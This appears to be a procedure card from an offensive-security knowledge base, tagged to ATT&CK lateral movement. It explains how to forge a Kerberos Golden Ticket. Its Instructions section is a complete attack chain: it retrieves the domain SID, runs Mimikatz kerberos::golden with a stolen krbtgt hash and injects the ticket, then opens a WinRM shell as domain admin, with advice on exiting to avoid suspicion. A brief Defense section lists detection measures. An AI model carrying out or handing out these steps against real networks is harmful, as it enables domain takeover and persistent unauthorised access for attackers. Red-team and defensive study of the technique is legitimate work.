---
id: c4dc0059-3ea5-444f-876f-43bf7d5ef01e
name: Create-Golden-Ticket-and-Launch-Windows-Shell
type: procedure
verified: true
submitted: false
created_at: '2020-07-07T04:30:50.362471+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/Active Directory]]'
  - '[[tags/NTLM]]'
  - '[[tags/persistence]]'
  - '[[tags/powershell]]'
commands:
  - '[[commands/get-addomain-get-domain-information]]'
  - '[[commands/mimikatz-golden-ticket-creation]]'
  - '[[commands/enter-pssession-spawn-winrm-session]]'
tools: []
validated: true
---

# Create-Golden-Ticket-and-Launch-Windows-Shell

## Summary

This procedure uses the domain's krbtgt NTLM hash, obtained from a domain controller, to forge a Golden Ticket for persistent domain access. It then injects the ticket into memory and establishes a remote WinRM shell on a target system, enabling lateral movement without valid credentials.

## Description

Golden Tickets exploit Kerberos by forging TGTs using the krbtgt hash, granting indefinite domain admin access. This is typically done after compromising a domain controller via DCSync, LSA dump, or similar methods. The procedure assumes the attacker has local admin on a DC to extract the hash. Once created, the ticket is passed to a new session for remote execution via WinRM, allowing shell access to other systems. This technique is stealthy as it mimics legitimate Kerberos authentication and persists until the krbtgt hash is rotated.

## Requirements

1. Local administrator access on a domain controller to extract the krbtgt NTLM hash (via Mimikatz DCSync, secretsdump, or LSA dump).
2. Active Directory PowerShell module installed for domain queries.
3. Mimikatz executable available on the compromised system.
4. WinRM enabled on the target remote system.
5. Network connectivity to the target system.

## Defense

- Monitor for anomalous Kerberos ticket requests and unusual TGT lifetimes.
- Rotate the krbtgt hash regularly (every 6-12 months) to invalidate Golden Tickets.
- Enable Protected Users group and restrict NTLM usage.
- Log and alert on Mimikatz process execution or DCSync attempts via Event ID 4769.
- Use Windows Defender ATP or EDR to detect ticket forging tools.

## Objectives

1. Retrieve domain SID for ticket forging.
2. Forge and inject a Golden Ticket using the krbtgt hash.
3. Establish a remote shell on a target system using the injected ticket.
4. Achieve persistent domain admin access for lateral movement.

## Instructions

### Step 1: Retrieve Domain Information

**Context**: Query Active Directory to obtain the domain name and SID, which are required parameters for forging the Golden Ticket. This step ensures the ticket is scoped to the correct domain.

**Command** ([[commands/get-addomain-get-domain-information]]):
```powershell
Get-ADDomain -Identity $_DOMAIN
```

> This command outputs domain details including the SID. Note the DomainSID value (e.g., S-1-5-21-... ) for use in the next step. If the domain name is unknown, use `Get-ADDomain` without -Identity to list available domains.

### Step 2: Forge and Inject Golden Ticket

**Context**: Use Mimikatz to create a Kerberos Golden Ticket with the krbtgt NTLM hash, domain, and SID. The /ptt flag injects it directly into the current session's memory, enabling immediate use without saving to disk.

**Command** ([[commands/mimikatz-golden-ticket-creation]]):
```cmd
Mimikatz.exe "kerberos::golden /domain:$_DOMAIN /sid:$_DOMAIN_SID /rc4:$_NTLM_HASH /user:Administrator /ptt" "exit"
```

> Replace $_DOMAIN with the domain FQDN (e.g., dev.tesla.local), $_DOMAIN_SID with the SID from Step 1, and $_NTLM_HASH with the 32-character NTLM hash of krbtgt. Success is indicated by 'Golden ticket ... successfully submitted for current session'. The ticket grants domain admin privileges until expiry (default 10 years).

### Step 3: Launch Remote WinRM Shell

**Context**: With the Golden Ticket injected, use PowerShell to create a remote session on the target system. This leverages the forged credentials for authentication without prompting for passwords.

**Command** ([[commands/enter-pssession-spawn-winrm-session]]):
```powershell
Enter-PSSession -ComputerName $_TARGET
```

> Specify $_TARGET as the hostname or IP of the remote system (e.g., dc-dev.dev.tesla.local). The session prompt changes to indicate connection (e.g., [target]: PS ... >). From here, execute commands as domain admin. If WinRM is disabled, alternatives like PsExec can be used with the injected ticket.

### Step 4: Verify and Exit Session

**Context**: Confirm access by running a simple command in the remote session, then exit cleanly to avoid suspicion.

**Instructions**: In the remote session, run `whoami /all` to verify domain admin privileges. Exit with `Exit-PSSession`.

> Expected: Output shows Administrator privileges in the domain context. This validates the Golden Ticket's effectiveness.
